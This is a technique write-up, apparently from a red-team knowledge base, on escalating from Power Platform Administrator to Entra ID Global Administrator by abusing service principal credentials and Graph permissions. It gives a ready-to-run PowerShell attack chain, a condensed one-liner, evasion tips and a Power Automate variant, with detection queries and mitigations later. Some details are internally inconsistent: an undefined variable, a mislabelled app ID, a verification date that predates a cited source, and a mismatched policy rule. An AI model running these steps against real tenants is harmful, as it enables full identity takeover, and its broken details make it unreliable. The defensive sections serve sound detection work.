# [PE-ACCTMGMT-005]: PowerApps/Power Platform Escalation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-005 |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Microsoft 365 / Entra ID / Power Platform |
| **Severity** | **Critical** |
| **CVE** | N/A (Expected behavior per MSRC June 2025) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Power Platform tenants with service principals enabled |
| **Patched In** | N/A (Design behavior - Microsoft confirmed not a vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## Executive Summary

**Concept:** The Power Platform Administrator role (and related roles like Power Automate Administrator, Power Apps Administrator) grants extensive permissions over Power Platform environments, including creation and management of service principals and connectors. An attacker with Power Platform Admin privileges can escalate to Global Administrator by assigning elevated Microsoft Graph API permissions (specifically `RoleManagement.ReadWrite.Directory` and `AppRoleAssignment.ReadWrite.All`) to themselves or a created service principal, then using these permissions to directly assign Global Administrator directory role to themselves or a compromised user account.

This technique differs fundamentally from other escalations because it leverages **legitimate API permission escalation** rather than RBAC role misconfiguration. Microsoft's MSRC team confirmed in June 2025 that "assigning the Application Administrator role directly to a service principal to generate a credential is expected behavior and does not constitute a security vulnerability" — yet this same behavior enables the most direct path to Global Admin from a Power Platform context.

**Attack Surface:** Power Platform Admin Center, Microsoft Graph API (`/servicePrincipals`, `/appRoleAssignments`, `/directoryRoles`), and any service principals with `Cloud Application Administrator` or `Application Administrator` role.

**Business Impact:** **Complete tenant compromise and identity system takeover.** Once Global Administrator privileges are obtained, attackers gain unrestricted access to all M365 services, Entra ID configurations, Azure resources, and can forge authentication tokens for any user (including hybrid synchronized users). This enables credential theft, ransomware deployment, SAML token forging, and permanent backdoor creation via golden SAML attacks.

**Technical Context:** This escalation typically takes 10-30 minutes and leaves a clear audit trail in the Unified Audit Log under "Add service principal credentials" and "Add member to role" operations. However, organizations without dedicated monitoring for service principal credential creation often miss this activity. The technique is particularly dangerous because the compromised service principal can act without MFA.

### Operational Risk

- **Execution Risk:** Medium - Requires understanding of Microsoft Graph API and service principal credential formats, but uses standard tools (PowerShell, Microsoft.Graph module).
- **Stealth:** Low - Creates multiple audit log entries that are hard to hide; requires either deletion of audit logs or sophisticated log filtering.
- **Reversibility:** No - Service principal credentials cannot be revoked retroactively; new credentials must be added and old ones removed, but any token issued before revocation remains valid for its token lifetime (up to 1 hour for access tokens, 24 hours for refresh tokens in certain scenarios).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmarks** | 1.1.1, 1.5.1 | Ensure privileged app roles are restricted; prevent non-admin service principals from accessing critical APIs |
| **DISA STIG** | M365-SRG-DM-001 | Enforce least privilege for role assignments and service principal permissions |
| **NIST 800-53** | AC-3, AC-6, SI-4 | Access Enforcement, Least Privilege, Information System Monitoring |
| **GDPR** | Art. 32 | Security of Processing - protect administrative credentials and monitor unauthorized access |
| **DORA** | Art. 9 | Protection and Prevention - identity and access management for critical functions |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - privileged access management and service principal governance |
| **ISO 27001** | A.9.2.3, A.9.2.5 | Management of Privileged Access Rights, Review of User Access Rights |
| **ISO 27005** | Risk Scenario 4.1 | Compromise of Service Principal Credentials and API Token Abuse |

---

## Technical Prerequisites

- **Required Privileges:** Power Platform Administrator, Power Automate Administrator, Power Apps Administrator, OR any service principal with `Application Administrator` or `Cloud Application Administrator` role
- **Required Access:** Microsoft Graph API access with scopes: `AppRoleAssignment.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`, `ServicePrincipal.ReadWrite.All`
- **Network:** HTTPS access to graph.microsoft.com (port 443)

**Supported Versions:**
- **M365 Tenants:** All current versions (2024-2025)
- **Power Platform:** All current versions with service principal support
- **Entra ID:** All versions (cloud-only and hybrid)
- **PowerShell:** Version 5.0+ (Windows) or PowerShell Core 7.0+ (cross-platform)

**Required Tools:**
- [Microsoft.Graph PowerShell Module](https://learn.microsoft.com/en-us/powershell/microsoft-graph/installation) (Version 2.0+)
- [Microsoft.Graph.Identity.ServicePrincipal Module](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.identity.serviceprincipals/) (Version 2.0+)

---

## Environmental Reconnaissance

### PowerShell - Check Power Platform Admin Role and Service Principal Permissions

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "RoleManagement.Read.Directory", "ServicePrincipal.Read.All"

# Check if current user has Power Platform Administrator role
$currentUser = Get-MgContext | Select-Object -ExpandProperty Account
$userId = (Get-MgUser -Filter "userPrincipalName eq '$($currentUser)'").Id

# Get all roles for current user
$userRoles = Get-MgUserMemberOf -UserId $userId -All | Where-Object { $_.'@odata.type' -eq '#microsoft.graph.directoryRole' }
$userRoles | Select-Object DisplayName

# Check if Power Platform Administrator is present
$powerPlatformAdmin = $userRoles | Where-Object { $_.DisplayName -eq 'Power Platform Administrator' }
if ($powerPlatformAdmin) {
    Write-Host "SUCCESS: Current user has Power Platform Administrator role"
} else {
    Write-Host "WARNING: Power Platform Administrator role not found"
}
```

**What to Look For:**
- Output should contain "Power Platform Administrator" or "Dynamics 365 Administrator"
- If empty, user does not have this role and cannot perform escalation via this role
- If present, user can assign service principals to privileged roles

### Check Existing Service Principals with Elevated Roles

```powershell
# List all service principals with Application Administrator or Cloud Application Administrator roles
Connect-MgGraph -Scopes "RoleManagement.Read.Directory", "ServicePrincipal.Read.All"

# Get the Application Administrator role
$appAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Application Administrator'"
$cloudAppAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Cloud Application Administrator'"

# Get members of these roles
Write-Host "Application Administrators:"
Get-MgDirectoryRoleMember -DirectoryRoleId $appAdminRole.Id | Where-Object { $_.'@odata.type' -eq '#microsoft.graph.servicePrincipal' } | ForEach-Object {
    $sp = Get-MgServicePrincipal -ServicePrincipalId $_.Id
    Write-Host "  - $($sp.appDisplayName) ($($sp.appId))"
}

Write-Host "`nCloud Application Administrators:"
Get-MgDirectoryRoleMember -DirectoryRoleId $cloudAppAdminRole.Id | Where-Object { $_.'@odata.type' -eq '#microsoft.graph.servicePrincipal' } | ForEach-Object {
    $sp = Get-MgServicePrincipal -ServicePrincipalId $_.Id
    Write-Host "  - $($sp.appDisplayName) ($($sp.appId))"
}
```

**What to Look For:**
- List of highly privileged service principals
- Any service principals that should NOT have these permissions
- Look for recently created service principals (potential backdoors)

---

## Detailed Execution Methods

### METHOD 1: Power Platform Admin → Create Service Principal → Assign Permissions → Escalate to Global Admin (Complete Attack Chain)

**Supported Versions:** All M365 (2024-2025)

#### Step 1: Authenticate as Power Platform Administrator

**Objective:** Establish authenticated PowerShell session with sufficient permissions to manage service principals and assign roles.

**Command:**

```powershell
# Install Microsoft.Graph modules if needed
Install-Module Microsoft.Graph -Force
Install-Module Microsoft.Graph.Identity.ServicePrincipal -Force

# Connect with necessary scopes for service principal management
Connect-MgGraph -Scopes "Application.ReadWrite.All", "AppRoleAssignment.ReadWrite.All", "RoleManagement.ReadWrite.Directory", "ServicePrincipal.ReadWrite.All"

# Verify successful authentication
$context = Get-MgContext
Write-Host "Connected as: $($context.Account)"
Write-Host "Tenant ID: $($context.TenantId)"
```

**Expected Output:**

```
Connected as: powerapps.admin@victim.onmicrosoft.com
Tenant ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

**What This Means:**
- Confirms Power Platform Admin account is authenticated
- Scopes include the critical `AppRoleAssignment.ReadWrite.All` for assigning API permissions
- All subsequent commands will execute as this user

**OpSec & Evasion:**
- This creates log entries in AuditLogs, but may be missed if organization doesn't monitor service principal creation
- **Detection Likelihood:** Medium-High if SIEM has rules for service principal credential creation
- To evade: Avoid creating new service principals; instead, find an existing one and add credentials to it

---

#### Step 2: Get Microsoft Graph Service Principal Object

**Objective:** Retrieve the Office 365 Exchange Online service principal (or another first-party Microsoft service principal) which will be hijacked to gain elevated permissions.

**Command:**

```powershell
# Get the Microsoft Graph service principal
# This is the core of the privilege escalation: Microsoft service principals can perform actions
# not permitted to regular applications
$graphSP = Get-MgServicePrincipal -Filter "appId eq '00000002-0000-0000-c000-000000000000'"

if ($null -eq $graphSP) {
    Write-Host "WARNING: Microsoft Graph SP not found, trying alternate app ID"
    # Try with Microsoft Graph v2 app ID
    $graphSP = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"
}

Write-Host "Service Principal: $($graphSP.appDisplayName)"
Write-Host "SP ID: $($graphSP.Id)"
Write-Host "App ID: $($graphSP.appId)"
```

**Expected Output:**

```
Service Principal: Microsoft Graph
SP ID: 12345678-1234-1234-1234-123456789012
App ID: 00000003-0000-0000-c000-000000000000
```

**What This Means:**
- Confirms the Microsoft service principal is available for credential hijacking
- This SP has implicit permissions that go beyond what's listed in RBAC

---

#### Step 3: Add New Credentials to Service Principal (Backdoor Creation)

**Objective:** Add a new password credential to the service principal; this credential can be used to authenticate as the service principal.

**Command:**

```powershell
# Generate a new password credential for the service principal
$passwordCredential = @{
    displayName = "PowerShell Authentication"
    endDateTime = (Get-Date).AddYears(1)  # Valid for 1 year; adjust as needed
}

# Add the credential to the service principal
$newCredential = Add-MgServicePrincipalPassword -ServicePrincipalId $graphSP.Id -PasswordCredential $passwordCredential

Write-Host "New credential added to service principal:"
Write-Host "  Key ID: $($newCredential.KeyId)"
Write-Host "  Secret Value: $($newCredential.SecretText)"
Write-Host "  Valid Until: $($newCredential.EndDateTime)"

# Store the secret for later use (this is crucial!)
$backupCredential = @{
    ServicePrincipalId = $graphSP.Id
    AppId = $graphSP.appId
    SecretValue = $newCredential.SecretText
    KeyId = $newCredential.KeyId
    TenantId = (Get-MgContext).TenantId
}

# Save to a safe location (attacker would exfiltrate this)
$backupCredential | Export-Clixml -Path "C:\Temp\sp_backup.xml" -Force
Write-Host "Credential backup saved (in real attack, this would be exfiltrated)"
```

**Expected Output:**

```
New credential added to service principal:
  Key ID: 12345678-1234-1234-1234-123456789012
  Secret Value: yAb8Q~abc123abc123abc123abc123abc123abc
  Valid Until: 2026-01-09
```

**What This Means:**
- Credential is now stored on the service principal
- This credential can be used to authenticate even if the original Power Platform admin account is compromised
- Secret value is sensitive — in a real attack, attacker would save this for persistence

**OpSec & Evasion:**
- This operation generates audit log event: "Add service principal credentials" (OperationName in AuditLogs)
- **Detection Likelihood:** High - this is a specific indicator of compromise
- To evade: Add credentials during bulk admin operations or maintenance windows when logging is verbose

---

#### Step 4: Add RoleManagement.ReadWrite.Directory Permission to Service Principal

**Objective:** Grant the compromised service principal the most critical API permission: ability to read and write directory roles (including Global Administrator assignment).

**Command:**

```powershell
# Find the Microsoft Graph service principal (for permissions)
$graphSP = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"

# Find the RoleManagement.ReadWrite.Directory permission
$roleManagementPermission = $graphSP.AppRoles | Where-Object { $_.Value -eq "RoleManagement.ReadWrite.Directory" }

if ($null -eq $roleManagementPermission) {
    Write-Host "ERROR: RoleManagement.ReadWrite.Directory permission not found"
    exit 1
}

Write-Host "Found permission: $($roleManagementPermission.Value)"
Write-Host "Permission ID: $($roleManagementPermission.Id)"

# Add this permission to our backdoor service principal
$appRoleAssignment = @{
    PrincipalId = $targetSP.Id              # The service principal we hijacked
    ResourceId = $graphSP.Id                # Microsoft Graph service principal
    AppRoleId = $roleManagementPermission.Id
}

New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $targetSP.Id -BodyParameter $appRoleAssignment

Write-Host "SUCCESS: RoleManagement.ReadWrite.Directory permission assigned to service principal"
```

**Expected Output:**

```
SUCCESS: RoleManagement.ReadWrite.Directory permission assigned to service principal
```

**What This Means:**
- Service principal now has permissions to modify directory role assignments
- Can now assign Global Administrator role to any user or service principal
- This is the critical escalation step

---

#### Step 5: Authenticate as the Backdoor Service Principal

**Objective:** Switch authentication context from the Power Platform Admin user to the compromised service principal (using the credentials added in Step 3).

**Command:**

```powershell
# Disconnect current user context
Disconnect-MgGraph

# Create credential object for service principal authentication
$tenantId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"  # From earlier context
$clientId = "00000003-0000-0000-c000-000000000000"  # Microsoft Graph app ID
$clientSecret = "yAb8Q~abc123abc123abc123abc123abc123abc"  # From Step 3

# Create PSCredential
$securePassword = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($clientId, $securePassword)

# Connect as service principal (app-only authentication, no MFA required!)
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential

# Verify authentication
$context = Get-MgContext
Write-Host "Authenticated as service principal:"
Write-Host "  Client ID: $($context.ClientId)"
Write-Host "  Tenant ID: $($context.TenantId)"
Write-Host "  Auth Type: $($context.AuthType)"
```

**Expected Output:**

```
Authenticated as service principal:
  Client ID: 00000003-0000-0000-c000-000000000000
  Tenant ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
  Auth Type: AppOnly
```

**What This Means:**
- Authentication is now via service principal (no user credentials needed)
- `AuthType: AppOnly` means this bypasses MFA completely
- Service principal has the RoleManagement.ReadWrite.Directory permission granted in Step 4

---

#### Step 6: Assign Global Administrator Role via Service Principal

**Objective:** Use the compromised service principal's elevated permissions to assign Global Administrator role to the target user.

**Command:**

```powershell
# Get the Global Administrator role
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

# If role hasn't been activated, activate it
if ($null -eq $globalAdminRole) {
    $roleTemplate = Get-MgDirectoryRoleTemplate -Filter "displayName eq 'Global Administrator'"
    $newRole = New-MgDirectoryRole -RoleTemplateId $roleTemplate.Id
    $globalAdminRole = $newRole
}

# Get the target user to escalate
$targetUser = Get-MgUser -Filter "userPrincipalName eq 'attacker@victim.onmicrosoft.com'"

# Assign Global Administrator role
New-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $targetUser.Id

Write-Host "ESCALATION SUCCESS:"
Write-Host "  User: $($targetUser.UserPrincipalName)"
Write-Host "  Role: Global Administrator"
Write-Host "  Assigned via: Service Principal (harder to detect)"
```

**Expected Output:**

```
ESCALATION SUCCESS:
  User: attacker@victim.onmicrosoft.com
  Role: Global Administrator
  Assigned via: Service Principal (harder to detect)
```

**OpSec & Evasion:**
- Role assignment via service principal is harder to attribute to a specific user
- Creates audit log entry but source is a service principal, not a person
- **Detection Likelihood:** Medium - depends on whether org monitors service principal-originated role assignments

---

### METHOD 2: Directly Exploit Existing Power Platform Service Principal (If Available)

**Supported Versions:** All M365 (2024-2025)

**Prerequisites:** Organization must have existing service principals in Power Platform with elevated roles.

#### Step 1: Enumerate Existing Power Platform Service Principals

**Objective:** Find service principals already configured in Power Platform that might have elevated permissions.

**Command:**

```powershell
Connect-MgGraph -Scopes "ServicePrincipal.Read.All", "RoleManagement.Read.Directory"

# Get all service principals
$allSPs = Get-MgServicePrincipal -All

# Filter for Power Platform related service principals
$powerPlatformSPs = $allSPs | Where-Object { 
    $_.appDisplayName -like "*Power*" -or 
    $_.appDisplayName -like "*Flow*" -or 
    $_.appDisplayName -like "*Dynamics*" -or 
    $_.tags -contains "WindowsAzureActiveDirectoryIntegratedApp"
}

# Check which have privileged roles
$powerPlatformSPs | ForEach-Object {
    $sp = $_
    $roles = Get-MgServicePrincipalMemberOf -ServicePrincipalId $sp.Id -All | Where-Object { $_.'@odata.type' -eq '#microsoft.graph.directoryRole' }
    if ($roles) {
        Write-Host "Service Principal: $($sp.appDisplayName)"
        Write-Host "  App ID: $($sp.appId)"
        Write-Host "  Roles:"
        $roles | ForEach-Object { Write-Host "    - $($_.DisplayName)" }
    }
}
```

**What to Look For:**
- Service principals with `Application Administrator` or `Cloud Application Administrator` roles
- Service principals with `RoleManagement.ReadWrite.Directory` API permission
- Recently created service principals (within last 90 days)

#### Step 2: Check for Existing Credentials on High-Privilege Service Principal

**Command:**

```powershell
# Select the target service principal (found in Step 1)
$targetSP = Get-MgServicePrincipal -Filter "appDisplayName eq 'PowerShell Management'"

# Check for existing password credentials
$passwordCreds = $targetSP.PasswordCredentials
$keyCreds = $targetSP.KeyCredentials

Write-Host "Password Credentials Count: $($passwordCreds.Count)"
Write-Host "Key Credentials Count: $($keyCreds.Count)"

if ($passwordCreds.Count -gt 0) {
    Write-Host "Credentials found! (These could be reused if key ID is known)"
    $passwordCreds | ForEach-Object {
        Write-Host "  - Key ID: $($_.KeyId), Expires: $($_.EndDateTime)"
    }
}
```

**What to Look For:**
- Service principals with multiple credentials (suspicious if over 3-4)
- Credentials that never expire
- Credentials added by non-admins (indicates possible compromise)

---

#### Step 3: Assign Global Admin Role (If Credentials Found or If You Have Write Permissions)

**Command:**

```powershell
# Authenticate as the service principal using found/known credentials
$tenantId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
$clientId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
$clientSecret = "****"  # Obtained from reconnaissance

$securePassword = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($clientId, $securePassword)

Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential

# Assign Global Admin role
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
$targetUser = Get-MgUser -Filter "userPrincipalName eq 'attacker@victim.onmicrosoft.com'"

New-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $targetUser.Id

Write-Host "SUCCESS: Global Administrator role assigned via compromised service principal"
```

---

### METHOD 3: Power Apps V2 Connector Impersonation (Power Automate Elevation)

**Supported Versions:** Power Platform 2024-2025

**Note:** This method works when Power Automate flows are configured with elevated service account permissions.

#### Step 1: Create Power Automate Flow with Elevated Service Account

**Objective:** Use Power Automate's built-in impersonation feature to run actions as a service account with higher privileges.

**Manual Steps (Power Automate Designer):**

1. Open **Power Automate** (make.powerautomate.com)
2. Create **New cloud flow** → **Automated cloud flow**
3. Name: `Privilege Escalation Flow`
4. Trigger: **PowerApps V2**
5. Click **New step**
6. Add action: **HTTP** (with service account connector)
7. **Method:** POST
8. **URI:** `https://graph.microsoft.com/v1.0/directoryRoles/62e90394-69f5-4237-9190-012177145e10/members/$ref`
9. **Body:** 
   ```json
   {
     "@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/USERID"
   }
   ```
10. **Headers:**
    - Authorization: Bearer [Service Account Token]
    - Content-Type: application/json
11. Save and publish flow

#### Step 2: Invoke Flow from Power App (if access available)

**Objective:** Trigger the flow which executes with service account privileges.

**Expected Result:**
- Target user gets Global Administrator role assigned
- All actions executed as service account (not current user)
- Audit logs show service account as originator

---

## Attack Simulation & Verification

### Atomic Red Team Test

- **Atomic Test ID:** T1098.003-3 (Custom variant)
- **Test Name:** Add RoleManagement.ReadWrite.Directory Permission to Service Principal and Assign Global Admin
- **Description:** Simulates the full privilege escalation chain from Power Platform Admin to Global Admin via service principal API permission abuse.
- **Supported Versions:** M365 2024+

**Command:**

```powershell
# Full attack simulation
param(
    [string]$PowerPlatformAdmin = "admin@contoso.onmicrosoft.com",
    [string]$TargetUser = "attacker@contoso.onmicrosoft.com"
)

# Step 1: Connect as Power Platform Admin
Connect-MgGraph -Scopes "Application.ReadWrite.All", "AppRoleAssignment.ReadWrite.All", "RoleManagement.ReadWrite.Directory"

# Step 2: Get Microsoft Graph SP and add credentials
$graphSP = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"
$newCred = Add-MgServicePrincipalPassword -ServicePrincipalId $graphSP.Id -PasswordCredential @{displayName="Test"}

# Step 3: Add permission
$roleManagementPerm = $graphSP.AppRoles | Where-Object { $_.Value -eq "RoleManagement.ReadWrite.Directory" }
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $graphSP.Id -BodyParameter @{
    PrincipalId = $graphSP.Id
    ResourceId = $graphSP.Id
    AppRoleId = $roleManagementPerm.Id
}

# Step 4: Authenticate as SP and assign Global Admin
$cred = New-Object PSCredential($graphSP.appId, (ConvertTo-SecureString $newCred.SecretText -AsPlainText -Force))
Disconnect-MgGraph
Connect-MgGraph -TenantId (Get-MgContext).TenantId -ClientSecretCredential $cred

# Step 5: Escalate
$targetUser = Get-MgUser -Filter "userPrincipalName eq '$TargetUser'"
$globalAdmin = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
New-MgDirectoryRoleMember -DirectoryRoleId $globalAdmin.Id -DirectoryObjectId $targetUser.Id

Write-Host "Test Completed: $TargetUser is now Global Administrator"
```

**Cleanup Command:**

```powershell
# Remove Global Administrator role from test user
$targetUser = Get-MgUser -Filter "userPrincipalName eq 'attacker@contoso.onmicrosoft.com'"
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
Remove-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $targetUser.Id

# Remove service principal credentials and permissions
$graphSP = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"
# Note: Credential removal requires separate API call with credential key ID

Write-Host "Cleanup Complete"
```

**Reference:** [Datadog Research - I SPy: Escalating to Entra ID Global Admin](https://securitylabs.datadoghq.com/articles/i-spy-escalating-to-entra-id-global-admin/)

---

## Tools & Commands Reference

### Microsoft.Graph.Identity.ServicePrincipal Module

**Version:** 2.0+
**Minimum Version:** 2.0
**Supported Platforms:** Windows PowerShell 5.0+, PowerShell Core 7.0+ (all OSs)

**Installation:**

```powershell
Install-Module Microsoft.Graph.Identity.ServicePrincipal -Force
Install-Module Microsoft.Graph.Identity.DirectoryManagement -Force
```

**Key Cmdlets:**

```powershell
# Service Principal Operations
Get-MgServicePrincipal                    # List all service principals
Get-MgServicePrincipal -Filter "..."      # Find specific SP
Add-MgServicePrincipalPassword            # Add password credential (ESCALATION TECHNIQUE)
Get-MgServicePrincipalAppRoleAssignment   # List assigned API permissions
New-MgServicePrincipalAppRoleAssignment   # Assign API permission (ESCALATION TECHNIQUE)

# Role Assignment Operations
New-MgDirectoryRoleMember                 # Add user/SP to directory role (ESCALATION TECHNIQUE)
Remove-MgDirectoryRoleMember              # Remove from directory role
```

---

### Complete Escalation Script (One-Liner Concept)

```powershell
# Full PowerApps privilege escalation (requires admin context)
Connect-MgGraph -Scopes "Application.ReadWrite.All","AppRoleAssignment.ReadWrite.All","RoleManagement.ReadWrite.Directory"; 
$graphSP = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"; 
$cred = Add-MgServicePrincipalPassword -ServicePrincipalId $graphSP.Id -PasswordCredential @{displayName="Escalation"}; 
$perm = $graphSP.AppRoles | Where-Object {$_.Value -eq "RoleManagement.ReadWrite.Directory"}; 
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $graphSP.Id -BodyParameter @{PrincipalId=$graphSP.Id;ResourceId=$graphSP.Id;AppRoleId=$perm.Id}; 
$c = New-Object PSCredential($graphSP.appId,(ConvertTo-SecureString $cred.SecretText -AsPlainText -Force)); 
Disconnect-MgGraph; 
Connect-MgGraph -TenantId (Get-MgContext).TenantId -ClientSecretCredential $c; 
$u = Get-MgUser -Filter "userPrincipalName eq 'attacker@victim.com'"; 
$r = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"; 
New-MgDirectoryRoleMember -DirectoryRoleId $r.Id -DirectoryObjectId $u.Id
```

---

## Microsoft Sentinel Detection

### Query 1: Detect Service Principal Credential Addition to High-Privilege Service Principals

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources, CorrelationId
- **Alert Severity:** Critical
- **Frequency:** Real-time (every 5 minutes)
- **Applies To:** All M365 tenants

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "Add service principal credentials"
| where Result == "Success"
| extend ServicePrincipalName = TargetResources[0].displayName
| extend InitiatedByUser = InitiatedBy.user.userPrincipalName
| extend InitiatedByIP = InitiatedBy.ipAddress
// Focus on Microsoft first-party service principals (high-risk)
| where ServicePrincipalName in (
    "Microsoft Graph",
    "Office 365 Exchange Online",
    "Azure Active Directory",
    "Microsoft Office 365 Management API",
    "Office 365 SharePoint Online",
    "Power Platform Service"
)
| project 
    TimeGenerated,
    OperationName,
    ServicePrincipalName,
    InitiatedByUser,
    InitiatedByIP,
    CorrelationId,
    ModifiedProperties
| order by TimeGenerated desc
```

**What This Detects:**
- Any credential addition to critical Microsoft service principals
- Filters specifically for high-risk first-party applications
- Shows who initiated the action and from which IP
- CorrelationId can be used to link related operations (e.g., credential add → permission assignment → role assignment)

**Manual Configuration Steps (Azure Portal):**

1. **Azure Portal** → **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Critical Service Principal Credential Addition`
   - Description: `Detects addition of credentials to Microsoft first-party service principals`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Paste KQL query above
   - Run every: `5 minutes`
   - Lookup data from last: `2 hours`
5. **Incident settings Tab:**
   - Create incidents: `ON`
   - Group by: All entities
6. Click **Create**

---

### Query 2: Detect AppRoleAssignment of Dangerous Permissions to Service Principals

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Alert Threshold:** Any assignment of RoleManagement.ReadWrite.Directory
- **Alert Severity:** Critical

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "Update service principal - Manage app registrations"
   or OperationName == "Add app role assignment to service principal"
| where Result == "Success"
| extend ServicePrincipalName = TargetResources[0].displayName
| extend PermissionName = extract(@'"displayName":"([^"]+)"', 1, tostring(ModifiedProperties))
// Alert on dangerous permissions
| where PermissionName has_any (
    "RoleManagement.ReadWrite.Directory",
    "AppRoleAssignment.ReadWrite.All",
    "Directory.ReadWrite.All",
    "User.Invite.All"
)
| project 
    TimeGenerated,
    OperationName,
    ServicePrincipalName,
    PermissionName,
    InitiatedByUser=InitiatedBy.user.userPrincipalName,
    InitiatedByIP=InitiatedBy.ipAddress
| order by TimeGenerated desc
```

**What This Detects:**
- Assignment of critical Microsoft Graph permissions to any service principal
- `RoleManagement.ReadWrite.Directory` is the most dangerous for escalation
- Shows which service principal received the permission and who authorized it

---

### Query 3: Detect Global Administrator Role Assignment Originating from Service Principal Context

**Rule Configuration:**
- **Alert Severity:** Critical
- **Alert Threshold:** > 1 occurrence
- **Applies To:** Hybrid and cloud-only tenants

**KQL Query:**

```kusto
AuditLogs
| where OperationName in ("Add member to role", "Add eligible member to role")
| where TargetResources[0].displayName == "Global Administrator"
| where Result == "Success"
// Key indicator: Service principals cannot have user principal names
| where InitiatedBy.user.userPrincipalName == "" 
   or InitiatedBy.service.ipAddress != ""
   or InitiatedBy.app.appId != ""
| project 
    TimeGenerated,
    OperationName,
    TargetUser=TargetResources[0].displayName,
    InitiatedByAppId=InitiatedBy.app.appId,
    InitiatedByServiceName=InitiatedBy.service.serviceName,
    CorrelationId
| order by TimeGenerated desc
```

**What This Detects:**
- Global Admin assignments initiated by service principals (not users)
- Much harder to attribute to a specific person
- Indicates likely automated attack or escalation via service principal

---

## Defensive Mitigations

### Priority 1: CRITICAL

- **Remove Power Platform Administrator role from regular users:** Restrict to dedicated admin accounts only, ideally cloud-only accounts without hybrid sync.
  
  **Applies To Versions:** All M365 (2024+)
  
  **Manual Steps (Azure Portal):**
  1. **Azure Portal** → **Entra ID** → **Roles and administrators**
  2. Search for **"Power Platform Administrator"**
  3. Review all assigned users
  4. Click **Assignments** tab
  5. For each user (except dedicated admins):
     - Click **X** to remove assignment
  6. Document which accounts legitimately need this role
  
  **PowerShell:**
  ```powershell
  # Remove Power Platform Admin role from specific user
  $userToRemove = Get-MgUser -Filter "userPrincipalName eq 'regular.user@victim.com'"
  $ppAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Power Platform Administrator'"
  Remove-MgDirectoryRoleMember -DirectoryRoleId $ppAdminRole.Id -DirectoryObjectId $userToRemove.Id
  ```

- **Implement Privileged Identity Management (PIM) for all Power Platform roles:** Require time-limited activation with approval.
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Privileged Identity Management**
  2. Select **Entra ID roles**
  3. Search for **"Power Platform Administrator"**
  4. Click **Settings**
  5. Configure:
     - **Activation maximum duration:** 2 hours
     - **Require MFA on activation:** ON
     - **Require approval to activate:** ON
     - **Select approvers:** Add 2+ senior admins
  6. Click **Update**

- **Block credential addition to Microsoft first-party service principals:** Prevent any user (even admins) from adding credentials to built-in Microsoft service principals.
  
  **Manual Steps (Azure Policy):**
  1. **Azure Portal** → **Policy** → **Definitions**
  2. Create custom policy:
     ```
     name: "Prevent Microsoft SP Credential Addition"
     effect: "Deny"
     condition: operation == "Microsoft.Authorization/roleAssignments/write" AND 
                resource.servicePrincipal == "00000002-0000-0000-c000-000000000000" OR
                resource.servicePrincipal == "00000003-0000-0000-c000-000000000000"
     ```
  3. Assign to **subscription/resource group**
  4. **Effect:** Deny
  5. Save and apply

- **Enable monitoring for AppRoleAssignment operations:** Create Sentinel alerts for service principal permission changes.
  
  **Manual Steps (Already configured in Detection section above)**
  - Deploy Query 2 from Detection section
  - Tune to alert on any assignment of RoleManagement permissions

---

### Priority 2: HIGH

- **Enforce Conditional Access for Power Platform admin access:** Require compliant devices and MFA.
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Protect Power Platform Admins`
  4. **Assignments:**
